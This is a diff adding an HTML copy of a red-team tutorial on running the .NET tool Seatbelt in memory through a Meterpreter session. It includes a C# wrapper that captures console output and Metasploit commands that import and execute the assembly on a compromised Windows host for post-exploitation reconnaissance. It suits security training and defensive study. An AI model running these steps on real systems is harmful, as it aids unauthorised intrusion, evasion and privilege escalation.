@@ -1,0 +1,131 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Run .NET Assembly In Memory</title>
+</head><body>https://p16.praetorian.com/blog/running-a-.net-assembly-in-memory-with-meterpreter<br/>
+<br/>
+A feature in Cobalt Strike, Meterpreter doesn't have a great ability to run .NET C# code in memory, but with a few modifications, it can!<br/>
+<br/>
+If you’re not familiar with the concept of in-memory execution, essentially it consists of directly mapping a program into memory and executing it, instead of loading from a file on disk. For more details watch the Cobalt Strike <a href="https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/">In-Memory Evasion</a>&nbsp;series. Even without Cobalt Strike knowledge, the videos do an excellent job introducing the concepts of In-Memory execution. &nbsp; <br/>
+<br/>
+<br/>
+<b>What you’ll need:</b><br/>
+<ul><li>&nbsp;Visual Studio Code installed on a Windows box (VMs work well)</li>
+<li>.NET 3.5 and/or .NET 4.0 features installed in Visual Studio</li>
+<li>Some C# code to run, <a href="https://github.com/GhostPack/Seatbelt/tree/ca2036f488f5412395a242fb011e1ff3de17eaf8">Seatbelt</a>. Feel free to use your own code</li>
+<li>A Meterpreter session on a target Windows box with the corresponding .NET runtime installed</li>
+<li>15 - 20 minutes</li>
+</ul>
+<br/>
+<b>Three steps:</b><br/>
+Build and check<br/>
+Modify, build, and check<br/>
+Execute in-memory<br/>
+<br/>
+<b>Building the C# Project </b><br/>
+First, download the <a href="https://github.com/GhostPack/Seatbelt/tree/ca2036f488f5412395a242fb011e1ff3de17eaf8">Seatbelt</a>&nbsp;project on the Windows Visual Studio Code VM and open up the included Visual Studio project file Seatbelt.sln. Confirm that everything is working as expected by changing the build configuration from “Debug” to “Release” in the Visual Studio project and building the project. <br/>
+&nbsp;<br/>
+Expected output:<br/>
+&nbsp;1&gt;------ Build started: Project: Seatbelt, Configuration: Release Any CPU ------ <br/>
+&nbsp;1&gt; Seatbelt -&gt; C:\Users\vmtest\Desktop\Seatbelt-master\Seatbelt\bin\Release\Seatbelt.exe <br/>
+&nbsp;========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ========== <br/>
+<br/>
+Once built it’s a good idea to run Seatbelt.exe from a powershell prompt just to verify proper execution.<br/>
+&nbsp; <br/>
+<br/>
+<b>Modifying the Project</b><br/>
+A couple minor changes to the source code are required in order to run the program from a Meterpreter session with the powershell module. First modify the accessibility level of the Program class. We are adding an access modifier public to allow us to run the code after being imported as a library (more on that later on).<br/>
+<br/>
+Change line 155 in Program.cs from:<br/>
+<br/>
+&#09;class Program<br/>
+&#09;{<br/>
+<br/>
+To:<br/>
+&#09;public class Program<br/>
+&#09;{<br/>
+<br/>
+Next add an exported function to call via Meterpreter. <br/>
+One option is to modify the code of the Seatbelt program and export some of the already written functions. Another option is to provide a wrapper around Main, redirect the Console.stdout stream and interact with the wrapper function from the powershell module. This article will follow the second approach, but there are numerous possibilities here. Add the following function to Seatbelt's Program.cs:<br/>
+<br/>
+<b>At the top add the required imports</b><br/>
+<br/>
+using System.IO;<br/>
+using System.Text;<br/>
+<br/>
+<b>Lines 6816 - 6835 (right before static void Main), write a wrapper</b><br/>
+<br/>
+public static string BuckleUp()<br/>
+{<br/>
+&nbsp; &nbsp; MemoryStream stream = new MemoryStream();<br/>
+&nbsp; &nbsp; StreamWriter sw = new StreamWriter(stream);<br/>
+&nbsp; &nbsp; TextWriter old_stdout = Console.Out;<br/>
+&nbsp; &nbsp; Console.SetOut(sw);<br/>
+<br/>
+&nbsp; &nbsp; //hard coded command line arguments<br/>
+&nbsp; &nbsp; string[] args = "all".Split(null);<br/>
+&nbsp; &nbsp; Main(args);<br/>
+<br/>
+&nbsp; &nbsp; Console.SetOut(old_stdout);<br/>
+&nbsp; &nbsp; sw.Flush();<br/>
+&nbsp; &nbsp; string output = Encoding.ASCII.GetString(stream.ToArray());<br/>
+&nbsp; &nbsp; sw.Close();<br/>
+&nbsp; &nbsp; return output;<br/>
+}<br/>
+<br/>
+There are a couple important parts of the code to note. Two modifiers are included, <ul><li>One, The function declaration is public as the function is to be called externally (from the powershell module in Meterpreter), and </li>
+<li>Two, The field modifier static is included so the function is part of the type’s state, rather than the object’s state.</li>
+</ul>
+<br/>
+The code returns a string to avoid issues with stdout not displaying in the Metasploit console when executing from the powershell module. The returned string consists of everything Seatbelt writes to the Console. The BuckleUp function changes the default stdout stream to an in memory buffer, and then executes Seatbelt’s Main function with a hard-coded command line. After Seatbelt completes, the buffer is flushed and the string is returned as output. This is definitely a “hacky” approach, but avoids lots of modification to the Seatbelt source and can easily be extended to many other console application post-ex projects.<br/>
+<br/>
+Now rebuild the Seatbelt project (or your own project) in its Release configuration. No changes to the configuration are necessary, it can still be built as an .NET executable.<br/>
+<br/>
+<br/>
+<b>Loading and Testing with Powershell</b><br/>
+Before loading with Meterpreter, test locally on the VM. Open up a Powershell prompt and load the file with the following command.<br/>
+<br/>
+Windows PowerShell<br/>
+Copyright (C) Microsoft Corporation. All rights reserved.<br/>
+<br/>
+PS C:\Users\vmtest&gt; [Reflection.Assembly]::LoadFile("C:\Users\vmtest\Desktop\Seatbelt-master\Seatbelt\bin\Release\Seatbelt.exe")<br/>
+<br/>
+GAC &nbsp; &nbsp;Version &nbsp; &nbsp; &nbsp; &nbsp;Location<br/>
+--- &nbsp; &nbsp;------- &nbsp; &nbsp; &nbsp; &nbsp;--------<br/>
+False &nbsp;v2.0.50727 &nbsp; &nbsp; C:\Users\vmtest\Desktop\Seatbelt-master\Seatbelt\bin\Release\Seatbelt.exe<br/>
+<br/>
+<br/>
+PS C:\Users\vmtest&gt; [Seatbelt.Program]::BuckleUp("all")<br/>
+<br/>
+If that worked everything is all set for executing with Meterpreter.<br/>
+<br/>
+<br/>
+<b>Loading with Meterpreter</b><br/>
+Copy your .NET executable to your Meterpreter server and change the extension from .exe to .dll. Metasploit’s powershell_import will refuse to load the file if does not end with .dll (even if it contains exported functions). Then interact with the session and run the following commands:<br/>
+<br/>
+msf5 exploit(multi/handler) &gt; sessions -i 1<br/>
+[*] Starting interaction with 1…<br/>
+<br/>
+meterpreter &gt; load powershell<br/>
+Loading extension powershell…Success.<br/>
+meterpreter &gt; powershell_import Seatbelt.dll<br/>
+[+] File successfully imported. No result was returned.<br/>
+<br/>
+The powershell extension is now loaded and the C# Seatbelt assembly has been imported into the current session. Now we can interact with the exported function in the same way as on the VM.<br/>
+<br/>
+meterpreter &gt; powershell_execute [Seatbelt.Program]::BuckleUp()<br/>
+<br/>
+And after a few seconds:<br/>
+<br/>
+<br/>
+[+] Command execution completed:<br/>
+=== Running System Triage Checks ===<br/>
+...<br/>
+clipped Seatbelt output<br/>
+...<br/>
+<br/>
+<br/>
+<br/>
+<b>Final Thoughts</b><br/>
+In memory execution is a useful tool for an attacker’s arsenal. Using Meterpreter, we leveraged our initial foothold on the Windows machine and executed a .NET assembly in memory. Hopefully with the additional context provided from Seatbelt a privesc is now within reach. The procedure demonstrated here can be extended to other C# post exploitation projects (Bloodhound) or even custom built ones.</body></html>
